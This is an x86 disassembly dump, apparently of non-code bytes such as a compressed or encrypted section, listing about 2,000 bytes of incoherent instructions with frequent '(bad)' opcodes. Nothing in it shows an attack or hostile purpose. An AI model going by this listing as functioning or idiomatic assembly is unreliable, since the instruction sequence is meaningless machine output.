  411fc3:	ins    BYTE PTR es:[edi],dx
  411fc4:	xor    edi,DWORD PTR [ebx-0x14]
  411fc7:	or     bl,al
  411fc9:	mov    edi,0x48ea0d15
  411fce:	cdq    
  411fcf:	pop    ds
  411fd0:	sub    dh,BYTE PTR [ebx]
  411fd2:	mov    cl,0x11
  411fd4:	ins    DWORD PTR es:[edi],dx
  411fd5:	test   al,0x92
  411fd7:	cli    
  411fd8:	push   ebp
  411fd9:	jae    0x41204c
  411fdb:	pop    esi
  411fdc:	push   DWORD PTR [ecx]
  411fde:	add    ebp,0xdea05783
  411fe4:	add    ch,al
  411fe6:	push   edi
  411fe7:	aaa    
  411fe8:	xor    DWORD PTR [ebx+eax*4-0x78],esp
  411fec:	fst    DWORD PTR [ebx+0x2a246256]
  411ff2:	dec    edx
  411ff3:	jo     0x411fff
  411ff5:	test   BYTE PTR [edx+0x77459cd0],cl
  411ffb:	lock push cs
  411ffd:	lods   al,BYTE PTR ds:[esi]
  411ffe:	neg    DWORD PTR [esi]
  412000:	pop    edx
  412001:	sbb    BYTE PTR [edi-0x29],dh
  412004:	mov    ds:0x74faec1e,al
  412009:	jb     0x41207a
  41200b:	xor    al,0xc2
  41200d:	lods   al,BYTE PTR ds:[esi]
  41200e:	fmul   DWORD PTR ss:[eax+0x20]
  412012:	xor    al,0x67
  412014:	sub    DWORD PTR [edi+edx*8+0x64a62b1a],ebp
  41201b:	ja     0x41203e
  41201d:	repz hlt 
  41201f:	push   edx
  412020:	push   0xa752a8cf
  412025:	shl    DWORD PTR [esi+0x25],1
  412028:	out    dx,al
  412029:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41202a:	inc    ecx
  41202b:	adc    DWORD PTR [ebx],edi
  41202d:	sub    DWORD PTR [eax],esp
  41202f:	shr    edi,cl
  412031:	jbe    0x412012
  412033:	aam    0xc2
  412035:	mov    al,0x90
  412037:	pop    esp
  412038:	mov    bl,0xfd
  41203a:	gs cwde 
  41203c:	fadd   DWORD PTR [ebx+edx*4+0x9]
  412040:	mov    al,0x5e
  412042:	pinsrw mm1,WORD PTR [ebx+0x478195f],0x15
  41204a:	or     BYTE PTR [ecx+0x67],cl
  41204d:	push   ebx
  41204e:	popa   
  41204f:	mov    ds:0xe7aed1a6,al
  412054:	fidiv  WORD PTR [eax-0x26]
  412057:	stc    
  412058:	sub    bh,BYTE PTR [ebp-0x33a8d5fe]
  41205e:	inc    esi
  41205f:	mov    ebx,0x227f0339
  412064:	lods   al,BYTE PTR ds:[esi]
  412065:	enter  0xb17c,0x3e
  412069:	adc    al,0x5b
  41206b:	sub    al,0x3b
  41206d:	std    
  41206e:	adc    BYTE PTR [ebx+0x2a0b4a0f],dl
  412074:	ficom  WORD PTR [edi+edx*1-0x68]
  412078:	pop    ecx
  412079:	sbb    BYTE PTR [ecx+0x39e75f0f],bh
  41207f:	push   DWORD PTR [eax-0x675c3efc]
  412085:	cmp    ch,BYTE PTR [ecx-0x2c37675e]
  41208b:	adc    edx,DWORD PTR [edi]
  41208d:	or     DWORD PTR [ecx+0x7c8fdee4],esi
  412093:	adc    DWORD PTR [edi+0x174575c],ebx
  412099:	add    BYTE PTR [esi-0x64224fe7],bl
  41209f:	pop    esi
  4120a0:	outs   dx,DWORD PTR ds:[esi]
  4120a1:	inc    edi
  4120a2:	lods   al,BYTE PTR ds:[esi]
  4120a3:	jg     0x41202d
  4120a5:	rcl    BYTE PTR [edi+0x293e19a2],1
  4120ab:	outs   dx,BYTE PTR ds:[esi]
  4120ac:	mov    ch,0x9c
  4120ae:	jp     0x4120c1
  4120b0:	jno    0x4120f1
  4120b2:	in     eax,0x3a
  4120b4:	fisttp DWORD PTR [ebx+0x3c]
  4120b7:	and    al,0x8e
  4120b9:	push   edi
  4120bb:	pop    ebx
  4120bc:	sbb    DWORD PTR [edi],edi
  4120be:	(bad)  
  4120bf:	dec    edi
  4120c0:	sbb    esi,DWORD PTR [edi+eax*2]
  4120c3:	sbb    eax,0x6f2791e6
  4120c8:	lahf   
  4120c9:	rcr    cl,1
  4120cb:	jo     0x41210e
  4120cd:	ins    DWORD PTR es:[edi],dx
  4120ce:	cli    
  4120cf:	iret   
  4120d0:	sub    eax,0x7ec3229f
  4120d5:	sub    edx,eax
  4120d7:	lock add al,BYTE PTR [edi+ebx*1-0x59]
  4120dc:	(bad)  
  4120dd:	fdiv   QWORD PTR [edx+0x28]
  4120e0:	arpl   WORD PTR [ebp-0x53],dx
  4120e3:	(bad)  
  4120e4:	enter  0x5240,0x8d
  4120e8:	mov    esi,0x92c0199d
  4120ed:	mov    ebp,ss
  4120ef:	loope  0x412115
  4120f1:	pop    ebp
  4120f2:	ficom  WORD PTR [ecx]
  4120f4:	mov    ?,WORD PTR [edx-0x13ec177a]
  4120fa:	test   bh,bh
  4120fc:	inc    eax
  4120fd:	cdq    
  4120fe:	or     bh,ch
  412100:	ret    
  412101:	jp     0x412092
  412103:	dec    edx
  412104:	xchg   ebx,eax
  412105:	inc    ecx
  412106:	mov    bh,0xe2
  412108:	repnz test BYTE PTR [ebp+esi*8-0x12],0x70
  41210e:	into   
  41210f:	push   edi
  412110:	cwde   
  412111:	cld    
  412112:	xor    dl,bl
  412114:	mov    dl,0xbc
  412116:	dec    edx
  412117:	push   ds
  412118:	lock loope 0x412137
  41211b:	adc    al,0x74
  41211d:	sbb    cl,bh
  41211f:	shl    DWORD PTR [ecx-0x4],1
  412122:	push   ss
  412123:	hlt    
  412124:	sti    
  412125:	mov    al,ds:0xa2c4f5ed
  41212a:	cdq    
  41212b:	sub    eax,0xe2d095fd
  412130:	in     al,dx
  412131:	inc    edx
  412132:	daa    
  412133:	cmp    ebx,DWORD PTR [edx+0x1a]
  412136:	inc    edx
  412137:	(bad)
  41213a:	inc    ebx
  41213b:	repz mov edi,0x90517413
  412141:	icebp  
  412142:	scas   eax,DWORD PTR es:[edi]
  412143:	fisubr WORD PTR [ebx-0x55d15663]
  412149:	inc    esi
  41214a:	cmp    eax,0xdefa62fe
  41214f:	push   0xa
  412151:	pop    esi
  412152:	push   edi
  412153:	popa   
  412154:	and    BYTE PTR [eax-0x64],al
  412157:	retf   0xed1
  41215a:	push   eax
  41215b:	test   eax,esp
  41215d:	cwde   
  41215e:	mov    eax,ds:0xf438802
  412163:	es ins BYTE PTR es:[edi],dx
  412165:	rcl    BYTE PTR [ecx-0x54],0x32
  412169:	xchg   ebp,eax
  41216a:	pop    esi
  41216b:	fs and al,0x70
  41216e:	inc    ebx
  41216f:	push   cs
  412170:	xor    edi,ecx
  412172:	ins    DWORD PTR es:[edi],dx
  412173:	inc    esi
  412174:	add    BYTE PTR [edx+0xf234e3a],bh
  41217a:	retf   0x31cd
  41217d:	adc    BYTE PTR [ebp-0x4e],bl
  412180:	sub    DWORD PTR [edi+0x2],esi
  412183:	push   edx
  412184:	push   es
  412185:	adc    al,0xbb
  412187:	out    dx,eax
  412188:	pop    es
  412189:	mov    cl,0x49
  41218b:	add    al,0x83
  41218d:	(bad)  
  41218e:	stc    
  41218f:	cmp    BYTE PTR [ecx-0x1692b769],cl
  412195:	cmp    DWORD PTR [ebx+0x4dde383f],ebx
  41219b:	cld    
  41219c:	fcmovne st,st(0)
  41219e:	ins    DWORD PTR es:[edi],dx
  41219f:	repz dec esi
  4121a1:	pop    esi
  4121a2:	ret    
  4121a3:	mov    bl,0xc
  4121a5:	punpcklwd mm3,DWORD PTR [ebp-0x5c880f56]
  4121ac:	push   esp
  4121ad:	les    ecx,FWORD PTR [ebx-0x38351100]
  4121b3:	imul   ecx,DWORD PTR [edx],0xffffff95
  4121b6:	push   cs
  4121b7:	das    
  4121b8:	sbb    DWORD PTR [ebx+eiz*2-0x57e6d5b2],ecx
  4121bf:	retf   0xddc4
  4121c2:	xchg   cl,bl
  4121c4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4121c5:	xor    eax,0x5381bc7e
  4121ca:	fstp   TBYTE PTR [ebx+0x6a740f8c]
  4121d0:	into   
  4121d1:	xchg   ebp,eax
  4121d2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4121d3:	or     DWORD PTR [esi-0x741e5f0b],ebx
  4121d9:	pusha  
  4121da:	and    eax,0x7fcf1bfa
  4121df:	add    BYTE PTR [ecx-0x37c348a5],cl
  4121e5:	dec    edi
  4121e6:	nop
  4121e7:	mov    ebp,0x3e1e6347
  4121ec:	fist   DWORD PTR [eax+0x45fd9dcb]
  4121f2:	and    BYTE PTR [ebp-0x5],bl
  4121f5:	mov    esp,0xe406e812
  4121fa:	jns    0x4121ab
  4121fc:	inc    edx
  4121fd:	mov    esp,0xe8c5f6be
  412202:	loop   0x4121f5
  412204:	or     DWORD PTR [ebx],ebx
  412206:	aad    0xf4
  412208:	xchg   esp,eax
  412209:	addr16 sahf 
  41220b:	mov    ch,0x85
  41220d:	mov    eax,0x36aaccc2
  412212:	push   edi
  412213:	fadd   st,st(6)
  412215:	mov    esi,0x7a483464
  41221a:	xchg   edx,eax
  41221b:	rcr    DWORD PTR [eax],cl
  41221d:	jns    0x41229b
  41221f:	mov    edx,0x22c00f63
  412224:	test   bh,ah
  412226:	ror    BYTE PTR [edx+0x73],cl
  412229:	and    eax,0x2c8e6608
  41222e:	cmc    
  41222f:	cmp    al,0x26
  412231:	and    esi,ecx
  412233:	mov    dh,0x6
  412235:	xchg   ebp,eax
  412236:	xchg   ecx,eax
  412237:	pop    edx
  412238:	mov    DWORD PTR [edi],0x95c4730f
  41223e:	push   ebx
  41223f:	jns    0x41224c
  412241:	sbb    eax,0xdab23a98
  412246:	sub    al,0x3f
  412248:	push   esp
  412249:	pop    ebp
  41224a:	or     al,0x9b
  41224c:	dec    edi
  41224d:	jl     0x412289
  41224f:	cmp    DWORD PTR [edi+eiz*4-0x149d8828],ecx
  412256:	dec    ebx
  412257:	cmp    al,0x42
  412259:	push   esi
  41225a:	dec    ebx
  41225b:	jle    0x41223f
  41225d:	push   edi
  41225e:	and    ah,BYTE PTR [ebx+ebp*2+0xe]
  412262:	add    BYTE PTR [ebx+0x4b],bh
  412265:	pop    ds
  412266:	mov    dh,0x6
  412268:	outs   dx,DWORD PTR ds:[esi]
  412269:	je     0x412206
  41226b:	cld    
  41226c:	call   0x710b:0x29d6e0ff
  412273:	hlt    
  412274:	arpl   WORD PTR [ebx-0x14],bp
  412277:	retf   0x7c07
  41227a:	mov    cl,0xcc
  41227c:	stos   WORD PTR es:[edi],ax
  41227e:	or     esi,DWORD PTR [ecx-0x4c]
  412281:	call   0x39eeebbe
  412286:	push   ss
  412287:	mov    ebx,DWORD PTR [ecx]
  412289:	jmp    0x9e113a45
  41228e:	shl    esp,cl
  412290:	adc    ah,ah
  412292:	cli    
  412293:	sub    DWORD PTR [edi],ebp
  412295:	sar    BYTE PTR [esi],1
  412297:	push   0xabd23dd1
  41229c:	mov    ch,0x35
  41229e:	les    esi,FWORD PTR [eax]
  4122a0:	dec    ecx
  4122a1:	mov    esi,0xc7e7104f
  4122a6:	pop    edi
  4122a7:	aad    0xd5
  4122a9:	add    ah,ch
  4122ab:	xchg   ebp,eax
  4122ac:	dec    ecx
  4122ad:	fadd   QWORD PTR [ecx]
  4122af:	or     BYTE PTR [ebx+0x57],bh
  4122b2:	lods   al,BYTE PTR ds:[esi]
  4122b3:	out    0x23,al
  4122b5:	stos   BYTE PTR es:[edi],al
  4122b6:	das    
  4122b7:	(bad)  [ebp+0x12de5d8a]
  4122bd:	mov    ecx,edx
  4122bf:	and    edx,DWORD PTR [ebx*1+0x5bdd1ac5]
  4122c6:	inc    esi
  4122c7:	pop    ecx
  4122c8:	div    BYTE PTR [edi]
  4122ca:	push   ds
  4122cb:	push   ds
  4122cc:	mov    DWORD PTR [edx+0xd],esi
  4122cf:	mov    esi,0xb5b8cce5
  4122d4:	inc    ecx
  4122d5:	icebp  
  4122d6:	enter  0xf2e6,0x87
  4122da:	stos   BYTE PTR es:[edi],al
  4122db:	imul   esi,DWORD PTR [ecx-0x1b],0xed86fe78
  4122e2:	jge    0x4122d5
  4122e4:	mov    esi,0x484832cc
  4122e9:	rcl    BYTE PTR [edx-0x5919ffe1],1
  4122ef:	dec    ebx
  4122f0:	mov    dh,0x16
  4122f2:	xchg   ebp,eax
  4122f3:	pop    ebx
  4122f4:	and    ah,BYTE PTR ds:0xcd443043
  4122fa:	push   esp
  4122fb:	and    eax,0xe513d4d1
  412300:	jb     0x4122ca
  412302:	push   es
  412303:	xlat   BYTE PTR ds:[ebx]
  412304:	sub    BYTE PTR [ebx-0x7c],al
  412307:	and    eax,0xfe0d158b
  41230c:	mov    esp,0xc913f62d
  412311:	and    eax,0x4730134
  412316:	dec    esi
  412317:	cld    
  412318:	xor    al,al
  41231a:	jb     0x412343
  41231c:	das    
  41231d:	sar    BYTE PTR [ebp+0x58],1
  412320:	sub    ch,BYTE PTR [esp+ebp*2+0x4b5a9db1]
  412327:	outs   dx,BYTE PTR ds:[esi]
  412328:	adc    cl,BYTE PTR [ebx]
  41232a:	xor    dh,BYTE PTR ds:0x708b2cf0
  412330:	neg    BYTE PTR [esi+0x8c6325d]
  412336:	inc    esp
  412337:	aas    
  412338:	sub    eax,0xb56d3b29
  41233d:	outs   dx,BYTE PTR ds:[esi]
  41233e:	scas   eax,DWORD PTR es:[edi]
  41233f:	mov    bh,0xc6
  412341:	dec    ebp
  412342:	mov    dh,BYTE PTR [ebp+0x59]
  412345:	ror    BYTE PTR [eax],0xc4
  412348:	enter  0x4346,0xdb
  41234c:	lock add edi,DWORD PTR [ebx+0x5a]
  412350:	lahf   
  412351:	mov    DWORD PTR [ecx-0x66],edx
  412354:	ret    
  412355:	sbb    dl,BYTE PTR [edx-0x5f]
  412358:	jle    0x412371
  41235a:	xchg   BYTE PTR gs:[ecx],al
  41235d:	out    dx,ax
  41235f:	dec    edi
  412360:	ret    0x8ce
  412363:	cmovns esi,DWORD PTR [ebp+ebp*8+0x4ad72b42]
  41236b:	inc    edx
  41236c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41236d:	push   edx
  41236e:	and    edi,DWORD PTR [ebx]
  412370:	repz and ebx,DWORD PTR [eax+0x1c]
  412374:	xor    al,0x4d
  412376:	fsubr  DWORD PTR [ebp-0x8a1200e]
  41237c:	ins    BYTE PTR es:[edi],dx
  41237d:	cmp    BYTE PTR [ebp+0x3a727468],al
  412383:	push   esp
  412384:	push   ebp
  412385:	sub    ecx,DWORD PTR [esi-0x70455473]
  41238b:	sahf   
  41238c:	aas    
  41238d:	dec    ebp
  41238e:	cmp    ebp,edx
  412390:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412391:	and    BYTE PTR [esi+0x6a5b05a1],al
  412397:	pop    ecx
  412398:	idiv   esi
  41239a:	xchg   ebp,eax
  41239b:	inc    ebx
  41239c:	(bad)  
  41239d:	loop   0x41239a
  41239f:	pop    esi
  4123a0:	(bad)  
  4123a1:	push   ecx
  4123a2:	sub    DWORD PTR [eax-0x16],edi
  4123a5:	inc    ecx
  4123a6:	clc    
  4123a7:	mov    dh,0xac
  4123a9:	adc    al,0x9a
  4123ab:	test   eax,0x3896b84
  4123b0:	mov    WORD PTR [esi],ds
  4123b2:	pop    ds
  4123b3:	mov    ds:0x196732b4,eax
  4123b8:	lock vsqrtss xmm2,xmm1,DWORD PTR [eax+0x79]
  4123be:	push   esi
  4123bf:	push   edi
  4123c0:	dec    esp
  4123c1:	pop    ecx
  4123c2:	jns    0x4123c8
  4123c4:	sub    dl,BYTE PTR [edi]
  4123c6:	and    esp,ebp
  4123c8:	cdq    
  4123c9:	sbb    DWORD PTR [ebx],0xffffff96
  4123cc:	sub    eax,edx
  4123ce:	jmp    0x412434
  4123d0:	rcl    DWORD PTR [ebp+edi*2+0x19],0xe5
  4123d5:	jecxz  0x4123bc
  4123d7:	loopne 0x4123d7
  4123d9:	mov    cl,0x68
  4123db:	aaa    
  4123dc:	test   al,0x31
  4123de:	stos   BYTE PTR es:[edi],al
  4123df:	(bad)  
  4123e0:	xor    esi,DWORD PTR ds:[ebp+0x41911d43]
  4123e7:	frstor [ebx-0x50691282]
  4123ed:	ffreep st(2)
  4123ef:	sub    ebx,ebp
  4123f1:	xchg   esi,eax
  4123f2:	cmp    BYTE PTR [ebp+0x53],ch
  4123f5:	(bad)  
  4123f7:	pop    ds
  4123f8:	pop    edi
  4123f9:	push   esi
  4123fa:	stc    
  4123fb:	adc    ah,cl
  4123fd:	sbb    al,0x25
  4123ff:	jae    0x412445
  412401:	es gs je 0x4123a2
  412405:	xchg   ebx,eax
  412406:	pop    ds
  412407:	jae    0x4123cf
  412409:	push   ebx
  41240a:	cld    
  41240b:	cmp    bl,dh
  41240d:	ins    DWORD PTR es:[edi],dx
  41240e:	sbb    edx,DWORD PTR [ebx+ebp*8+0x72dd99f2]
  412415:	jecxz  0x4123c5
  412417:	mov    ch,0xed
  412419:	call   0x5d6:0xa380b1eb
  412420:	push   ecx
  412421:	mov    dl,0x62
  412423:	xchg   ebx,eax
  412424:	push   0xffffff89
  412426:	je     0x4123bb
  412428:	ja     0x412402
  41242a:	inc    ebx
  41242b:	scas   al,BYTE PTR es:[edi]
  41242c:	inc    ebp
  41242d:	fild   WORD PTR [edi+ebx*8-0x2d]
  412431:	lods   eax,DWORD PTR ds:[esi]
  412432:	fstp   TBYTE PTR [ecx-0x625cc241]
  412438:	jecxz  0x4124b1
  41243a:	pop    esp
  41243b:	pop    ds
  41243c:	cs sahf 
  41243e:	gs test BYTE PTR cs:[ebx+eax*8+0x6b],dl
  412444:	sbb    BYTE PTR [ebp-0xa],dl
  412447:	cdq    
  412448:	pop    ebx
  412449:	repz jp 0x412415
  41244c:	addr16 sbb bh,cl
  41244f:	jne    0x4123d2
  412451:	push   ds
  412452:	rol    BYTE PTR [esp+edi*2],0x7e
  412456:	push   0xce5fe7cf
  41245b:	rol    DWORD PTR [ecx],cl
  41245d:	shl    BYTE PTR [eax],1
  41245f:	fsubr  QWORD PTR [ebp-0x7f426ae7]
  412465:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412466:	add    dl,bh
  412468:	dec    eax
  412469:	stc    
  41246a:	ss (bad) 
  41246d:	jae    0x4124ea
  41246f:	aam    0xe4
  412471:	sub    BYTE PTR [edx],bh
  412473:	jecxz  0x4124f0
  412475:	and    dl,BYTE PTR [ebx-0x19]
  412478:	outs   dx,BYTE PTR ds:[esi]
  412479:	mov    ch,0xec
  41247b:	nop
  41247c:	cmp    DWORD PTR [esi],ecx
  41247e:	and    BYTE PTR [edi],bl
  412480:	xchg   edx,eax
  412481:	stos   BYTE PTR es:[edi],al
  412482:	fisttp WORD PTR [edi-0x5c]
  412485:	add    BYTE PTR ds:0x65c2e635,ah
  41248b:	mov    esi,0x30074d95
  412490:	sbb    bl,BYTE PTR [eax-0x6908c3ee]
  412496:	loop   0x412461
  412498:	pop    ebp
  412499:	xor    dl,BYTE PTR [eax]
  41249b:	imul   ecx,DWORD PTR [ebx+edi*1+0x28ed2806],0x76
  4124a3:	and    BYTE PTR [esi],cl
  4124a5:	sti    
  4124a6:	inc    ecx
  4124a7:	test   ebx,edi
  4124a9:	rol    BYTE PTR [edx-0x5cce49a1],1
  4124af:	inc    esp
  4124b0:	cmp    cl,BYTE PTR [ebx+0x51]
  4124b3:	xor    eax,0xbf6fb601
  4124b8:	mov    al,ds:0xb2525a91
  4124bd:	cs loop 0x4124e9
  4124c0:	cmc    
  4124c1:	mov    ebx,0xd3676c49
  4124c6:	inc    esp
  4124c7:	add    al,0xbe
  4124c9:	jp     0x412541
  4124cb:	test   eax,0x104ff883
  4124d0:	push   edi
  4124d1:	sahf   
  4124d2:	nop
  4124d3:	repz test eax,edx
  4124d6:	or     cl,bh
  4124d8:	add    eax,0x91319a68
  4124dd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4124de:	jno    0x412505
  4124e0:	dec    ecx
  4124e1:	mov    ebx,0x58e0056
  4124e6:	or     DWORD PTR [edx],edi
  4124e8:	hlt    
  4124e9:	cmp    dh,cl
  4124eb:	pop    ebx
  4124ec:	add    ebx,DWORD PTR [eax+0x6f]
  4124ef:	mov    edi,0x20e85fea
  4124f4:	inc    ebp
  4124f5:	pop    esi
  4124f6:	pusha  
  4124f7:	pop    ebp
  4124f8:	sub    eax,0xee597880
  4124fd:	jne    0x412576
  4124ff:	sbb    DWORD PTR [edx-0x431cba21],eax
  412505:	add    eax,0x7a14a1c
  41250a:	data16 loope 0x41257d
  41250d:	push   ebx
  41250e:	cmp    ebp,ebp
  412510:	xchg   ecx,eax
  412511:	sahf   
  412512:	push   esi
  412513:	xor    al,0xbe
  412515:	test   al,0xa4
  412517:	mov    edx,0x93cf81a9
  41251c:	mov    edx,DWORD PTR [edi]
  41251e:	call   0xf297:0xe453030e
  412525:	data16 test BYTE PTR ds:0x4c20b2c3,0xdc
  41252d:	sub    eax,0xd623b44f
  412532:	xchg   ebp,eax
  412533:	outs   dx,DWORD PTR ds:[esi]
  412534:	jae    0x4124c5
  412536:	sahf   
  412537:	push   0x1133dbf0
  41253c:	xor    ecx,DWORD PTR [ebp+0x64]
  41253f:	inc    esp
  412540:	cwde   
  412541:	call   0x95a5:0x7d0f50d8
  412548:	push   cs
  412549:	jl     0x41251d
  41254b:	fs int 0x3f
  41254e:	call   0x4430:0x2d4f7ab0
  412555:	and    BYTE PTR [edx],al
  412557:	leave  
  412558:	fnstsw WORD PTR [eax-0x773b34e7]
  41255e:	mov    ds:0x3324457,eax
  412563:	adc    cl,dh
  412565:	loop   0x41256f
  412567:	(bad)  
  412568:	fdivp  st(2),st
  41256a:	cs retf 
  41256c:	jge    0x41256a
  41256e:	xor    eax,0x656efb73
  412573:	cmp    eax,0x14977883
  412578:	xor    eax,DWORD PTR [esi-0x5c]
  41257b:	(bad)  
  41257c:	sub    bh,BYTE PTR [ebx-0x78]
  41257f:	clc    
  412580:	mov    cl,0x83
  412582:	stos   DWORD PTR es:[edi],eax
  412583:	movs   BYTE PTR es:[edi],BYTE PTR ss:[esi]
  412585:	jbe    0x4125b7
  412587:	jb     0x412540
  412589:	hlt    
  41258a:	out    0x89,al
  41258c:	sbb    eax,0x77f79058
  412591:	mov    esp,0x7c406a0b
  412596:	and    cl,bh
  412598:	loope  0x41254f
  41259a:	(bad)  
  41259b:	push   0x68
  41259d:	inc    esi
  41259e:	iret   
  41259f:	retf   
  4125a0:	nop
  4125a1:	inc    eax
  4125a2:	pushf  
  4125a3:	mov    bl,0x7
  4125a5:	jp     0x412590
  4125a7:	inc    eax
  4125a8:	repz xor eax,0x6c7a049
  4125ae:	bound  ecx,QWORD PTR ds:0x203d9074
  4125b4:	jb     0x4125c6
  4125b6:	mov    ds:0xfaf7741,eax
  4125bb:	retf   
  4125bc:	fisubr DWORD PTR [edi+0x4e]
  4125bf:	or     al,0x69
  4125c1:	outs   dx,DWORD PTR ds:[esi]
  4125c2:	clc    
  4125c3:	xor    ah,BYTE PTR [eax]
  4125c5:	cli    
  4125c6:	aad    0x76
  4125c8:	mov    eax,ds:0xfb6883a4
  4125cd:	sahf   
  4125ce:	adc    edx,edx
  4125d0:	mov    WORD PTR [edx],ss
  4125d2:	push   eax
  4125d4:	sahf   
  4125d5:	and    ebx,DWORD PTR [edx-0x67]
  4125d8:	rcr    BYTE PTR [ecx+0x27612169],1
  4125de:	(bad)  
  4125df:	xchg   esp,eax
  4125e0:	out    0xd2,eax
  4125e2:	or     DWORD PTR [esi-0x78],edi
  4125e5:	add    DWORD PTR [edi],esi
  4125e7:	clc    
  4125e8:	mov    ch,0x8c
  4125ea:	xchg   ecx,eax
  4125eb:	xchg   edx,eax
  4125ec:	pop    ebx
  4125ed:	xlat   BYTE PTR ds:[ebx]
  4125ee:	mov    ds:0xaf3dfd86,al
  4125f3:	mov    gs:0x3aaf99ea,eax
  4125f9:	sub    esp,DWORD PTR [ebx-0x3996bcbf]
  4125ff:	pop    ebp
  412600:	or     eax,0xe9fbf0ad
  412605:	add    al,0x9a
  412607:	inc    DWORD PTR [ecx-0x3ab7dbdb]
  41260d:	mov    edx,0x27af0ebb
  412612:	popa   
  412613:	or     DWORD PTR [ecx-0x1d],edi
  412616:	fst    st(2)
  412618:	push   ebp
  412619:	test   BYTE PTR [esi],dl
  41261b:	dec    eax
  41261c:	sub    eax,0x2138776e
  412621:	mov    edx,0x976f5f75
  412626:	add    eax,0xfc4424cb
  41262b:	xor    al,0xae
  41262d:	add    esp,DWORD PTR [ecx+0x40741d88]
  412633:	into   
  412634:	outs   dx,DWORD PTR ds:[esi]
  412635:	inc    ebx
  412636:	stc    
  412637:	ror    DWORD PTR [ecx-0x6b],cl
  41263a:	in     eax,dx
  41263b:	jp     0x412623
  41263d:	test   eax,esi
  41263f:	mov    cl,0xf3
  412641:	xor    eax,0xf6b0259b
  412646:	and    al,0xdf
  412648:	js     0x412620
  41264a:	ret    0xddb3
  41264d:	mov    edx,0x571420b2
  412652:	pop    DWORD PTR [edi+0x1a]
  412655:	mov    esi,DWORD PTR [eax-0x7d]
  412658:	mov    dh,0xb4
  41265a:	add    ah,BYTE PTR [esi-0x3323a4df]
  412660:	aas    
  412661:	jno    0x412611
  412663:	or     DWORD PTR [ebx+0x4c58b28a],eax
  412669:	bound  edx,QWORD PTR [edx-0x39]
  41266c:	sub    DWORD PTR [edi],0xff08d200
  412672:	loop   0x4126be
  412674:	test   DWORD PTR [esi+0x5a759ec9],0x8365abaf
  41267e:	scas   al,BYTE PTR es:[edi]
  41267f:	(bad)  
  412680:	adc    eax,DWORD PTR [edi-0x5e]
  412683:	or     al,0x6b
  412685:	out    dx,eax
  412686:	jp     0x4126b2
  412688:	mov    ds:0xdd0de7af,al
  41268d:	pop    edi
  41268e:	push   cs
  41268f:	fnsave [ecx-0x1ef9f42d]
  412695:	scas   al,BYTE PTR es:[edi]
  412696:	xor    eax,0x13b7a498
  41269b:	lods   al,BYTE PTR ds:[esi]
  41269c:	aam    0x95
  41269e:	dec    edi
  41269f:	add    al,0xf0
  4126a1:	jae    0x41270e
  4126a3:	aaa    
  4126a4:	sub    ebp,DWORD PTR [edi]
  4126a6:	mov    WORD PTR ds:0x834bcea5,cs
  4126ac:	mov    ds:0x3ec602a0,eax
  4126b1:	daa    
  4126b2:	cmp    BYTE PTR [eax],cl
  4126b4:	sub    BYTE PTR [esi+edi*8],dl
  4126b7:	inc    esi
  4126b8:	mov    edi,0x20d78f9a
  4126bd:	mov    edx,0x340c5c58
  4126c2:	adc    ah,BYTE PTR [ecx+0x7dca2849]
  4126c8:	mov    ds:0xa1a1d3b3,eax
  4126cd:	out    dx,al
  4126ce:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4126cf:	pause  
  4126d1:	leave  
  4126d2:	mov    al,ds:0x9bebce64
  4126d7:	adc    ah,BYTE PTR [ecx-0x65]
  4126da:	rol    DWORD PTR gs:[edi-0x620711d],cl
  4126e1:	loop   0x412716
  4126e3:	xor    ch,BYTE PTR [eax-0x16204fac]
  4126e9:	and    BYTE PTR [eax],ah
  4126eb:	cmp    BYTE PTR [esi-0x26],bh
  4126ee:	add    al,BYTE PTR [esi-0x332c438]
  4126f4:	push   ds
  4126f5:	and    dh,BYTE PTR [edi+0x25fedf3a]
  4126fb:	addr16 push ds
  4126fd:	cmp    eax,0x16d9221
  412702:	xchg   edx,eax
  412703:	add    al,BYTE PTR [esi-0x4a]
  412706:	das    
  412707:	push   edi
  412708:	push   edx
  412709:	rcl    BYTE PTR [ebx-0x1c],1
  41270c:	and    eax,0x9b131fc0
  412711:	fdiv   QWORD PTR [eax]
  412713:	push   ebx
  412714:	fldenv [bp+0x36]
  412718:	inc    ebx
  412719:	adc    DWORD PTR [ebx+0x710c3567],ebp
  41271f:	fld    st(1)
  412721:	or     eax,0x7e6e5015
  412726:	xchg   edx,eax
  412727:	pop    edx
  412728:	cmp    dh,0x7b
  41272b:	mov    ebp,0x2aecb21e
  412730:	push   ds
  412731:	cmp    ecx,esi
  412733:	stos   DWORD PTR es:[edi],eax
  412734:	sti    
  412735:	xchg   esp,eax
  412736:	add    esp,eax
  412738:	inc    ebp
  412739:	fstp   DWORD PTR [ecx-0x6]
  41273c:	ds pushf 
  41273e:	xchg   edi,eax
  41273f:	aad    0x89
  412741:	(bad)  
  412742:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412743:	jb     0x412725
  412745:	add    BYTE PTR [eax-0x36],0xa
  412749:	and    edi,DWORD PTR fs:[ecx]
  41274c:	push   ebp
  41274d:	stc    
  41274e:	xchg   esp,eax
  41274f:	and    al,0x24
  412751:	adc    eax,0xe6ab4d61
  412756:	mov    eax,ds:0xde7058fe
  41275b:	test   eax,0xc3b2596d
  412760:	cmp    BYTE PTR [esi-0x1a7dc204],dl
  412766:	xor    al,0xbb
  412768:	sub    bh,BYTE PTR [edi-0x26]
  41276b:	lods   al,BYTE PTR ds:[esi]
  41276c:	mov    esi,0xfd8239dd
  412771:	int    0x92
  412773:	mov    eax,gs:0x302dfc63
  412779:	pop    es
  41277a:	fdiv   DWORD PTR [edi]
  41277c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41277d:	lds    esi,FWORD PTR [esi]
  41277f:	mov    DWORD PTR [ebx],0xecb1a163
  412785:	push   ss
  412786:	inc    ebp
  412787:	cmp    al,0xba
  412789:	sbb    eax,0x1b10086b
  41278e:	pushf  
  41278f:	lea    ecx,[ecx+0x4b1c0132]
  412795:	ins    DWORD PTR es:[edi],dx
  412796:	xor    cl,bh
  412798:	aas    
  412799:	or     DWORD PTR ds:[esi+ebx*8],0x8c6e200f
  4127a1:	mov    dl,bh
  4127a3:	lds    eax,FWORD PTR [eax]
